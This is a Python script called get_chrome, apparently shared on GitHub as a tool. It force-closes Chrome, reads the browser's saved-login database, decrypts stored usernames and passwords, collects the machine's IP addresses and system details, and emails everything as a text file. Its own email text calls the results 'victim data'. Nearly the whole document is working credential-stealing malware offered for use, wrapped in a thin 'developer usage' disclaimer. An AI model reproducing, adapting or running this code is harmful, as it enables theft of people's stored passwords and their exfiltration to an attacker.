## made by parad0x 20/10/19 8:48pm ##
## WINDOWS ONLY ## // supports all

#imports
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32gui
import socket
import requests
import sqlite3
import win32crypt
import platform
import sys
import platform
import psutil
import uuid
import getpass

# print separator
sep = "----------------------------------------------------------------------------------------------"
min_sep = "--------------------------------"
med_sep = "--------------------------------------------------"
print(min_sep)
Changelog = "Latest Update: \n\nThursday 9th January 2020\n• Manually import Email Data\n• Gets advanced PC information\n• Entirely accessable, everything that's happening is displayed.\n\nTuesday, 14/01/2020:\n• get_chrome is now entirely a UI based console, everything that goes on is beneath your eyes!\n"
print(Changelog)
print(sep)
time.sleep(5)

# kills all browser services(this script works only on chrome, as of right now.)
def kill_browsers():
	print("Killing Chrome Task\n-------------------")
	## kill browsers ##
	browserExe = "chrome.exe"
	os.system("taskkill /f /im "+browserExe)
	print("-------------------------------------------")
	#clear messages
	#os.system("cls")
	# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
	#os.system("taskkill /f /im "+browserExe)
	#os.system("cls")
	# kills microsoft edge
	#os.system("taskkill /f /im MicrosoftEdge.exe")
	#os.system("cls")
	#os.system("taskkill /f /im MicrosoftEdgeCP.exe")
	#os.system("cls")
	#os.system("taskkill /f /im MicrosoftEdgeSH.exe")
	#os.system("cls")
	# kills firefox
	#os.system("taskkill /f /im firefox.exe")
	#os.system("cls")
	# kills opera
	#os.system("taskkill /f /im opera.exe")
	#os.system("cls")
	# kills internet explorer
	#os.system("taskkill /f /im iexplorer.exe")
	#os.system("cls")
	# clears console, making it invisible to user that we killed browser's process
	#os.system("cls")

# gather user info
program_name = 'get_chrome.py'
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())
OS = platform.system()
FQDN = socket.getfqdn()
Machine = platform.machine()
Node = platform.node()
Processor = platform.processor()
Release = platform.release()
Version = platform.version()
NOC = psutil.cpu_count()
welcome = 'Welcome ' + user + ' to ' + program_name + '!'
owner = 'This program was made by Parad0xxxx and Snavellet!'
warning = '\nThis program was intended for Developer Usage. Use with caution. If you choose to disobey these directions, you are at jeopardy!\n\n'
old_app = ''
filename = 'get_chrome.txt'

# sees if the OS is windows, if so - continue. If not - exits.
if (OS == "Windows"):
	print(welcome)
	print(med_sep)
	print(owner)
	print(med_sep)
	print("Your OS is supported")
	print(min_sep)
	pass # Continues script
else: # Exits the script with a message
	print(OS + " is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
	time.sleep(10)
	exit()


def text_file():
	print("Locating Chrome directory\n-------------------------")
	# directs to Chrome directory
	data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
	print("* Directory found\n-----------------")
	c = sqlite3.connect(data_path)
	cursor = c.cursor()
	print("Locating Login Details\n----------------------")
	select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
	# checks to see if database is locked	
	cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
	# fetches all chrome tables from database
	login_data = cursor.fetchall()
	print("* Login Details found\n---------------------")

	#credential dictionary		
	cred = {}

		# empty string for data
	string = ''

	# adds a message from the Developers
	string += '#### This program was made by Parad0xxxx and Snavellet!####\nPlease support the project:\nhttps://github.com/parad0xxxx/get_chrome/\n\n'
	# displays current window opened as they ran the script
	string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
	# writes user data to .txt file
	string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n' + 'Private IP: ' + privateIP + '\n'
	# get PC Advanced PC info
	string += 'PC Info: ' + 'Machine: ' + Machine + '\n' + 'FQDN: ' + FQDN + 'Node: ' + Node + '\n' + 'Release: ' + Release + '\n' + 'Version: ' + Version + '\n'
	# get Processor Info
	string += 'Processor Info: ' + Processor + '\n'
	# get CPU info
	string += 'CPU Count: ' + str(NOC) + '\n'

	# writing passwords to a .txt file
	for url, user_name, pwd in login_data:
	  	pwd = win32crypt.CryptUnprotectData(pwd)
	  	cred[url] = (user_name, pwd[1].decode('utf8'))
	  	string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
	  	with open('get_chrome.txt', 'w') as fp:
	  		fp.write(string)

# sends .txt as an attachment, to your email
def send_stuff():
	print("Starting Email Service\n---------------------")
	time.sleep(1)
	email_from = input("Enter your Email Address: ")
	password = getpass.getpass("Enter your Email Address password: ")
	email_to = input("Enter receiver Email Address: ")
	subject = 'get_chrome RESULTS'
	print('Sending Email to ' + email_to + ' from ' + email_from)
	msg = MIMEMultipart()
	msg['From'] = email_from
	msg['To'] = email_to
	msg['Subject'] = subject
	body = "Hi there!\nI see you've made it this far with get_chrome.\nPlease follow the instructions below.\n• Our latest update has allowed us to send the proper text format file.\n• Open the .txt file to retrieve victim data.\nThanks for using get_chrome\n[!] Please star our project: https://github.com/parad0xxxx/get_chrome\n[!] Follow me on GitHub: https://github.com/parad0xxxx\nCreator: ~ parad0x & snavellet"
	msg.attach(MIMEText(body,'plain'))
	filename='get_chrome.txt'
	attachment =open(filename,'rb')
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition',"attachment; filename= " + filename)
	msg.attach(part)
	text = msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(email_from,password)
	server.sendmail(email_from,email_to,text)
	print('Email Sent!')

# runs every event
if __name__ == '__main__':
	import click
	kill_browsers()
	text_file()	
	send_stuff()
	# prompts to keep or remove results
	if click.confirm('Do you want to download the output text file?', default=True):
		print('Results have been saved to ' + os.path.dirname(os.path.abspath(__file__)) + ' as ' + filename)
		pass
else:
	os.remove('get_chrome.txt')

print("You may now close the program")
time.sleep(60)
